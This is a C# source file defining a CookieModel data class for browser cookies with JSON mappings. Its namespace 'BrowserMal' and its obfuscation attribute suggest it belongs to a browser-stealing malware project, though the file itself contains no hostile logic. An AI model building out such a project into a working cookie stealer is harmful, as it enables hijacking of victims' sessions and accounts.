using Newtonsoft.Json;
using System;
using System.Reflection;

namespace BrowserMal.Model
{
    [ObfuscationAttribute(Exclude = true, ApplyToMembers = true)]
    public class CookieModel
    {
        [JsonProperty("domain")]
        public string Host { get; set; }

        [JsonProperty("name")]
        public string Name { get; set; }

        [JsonProperty("path")]
        public string Path { get; set; }

        [JsonProperty("expirationDate")]
        public string Expires { get; set; }

        [JsonProperty("value")]
        public string Value { get; set; }

        public CookieModel(string host = "", string name = "", string path = "", string expires = "", string value = "")
        {
            Host = host;
            Name = name;
            Path = path;
            Expires = expires;
            Value = value;
        }
        
    }
}
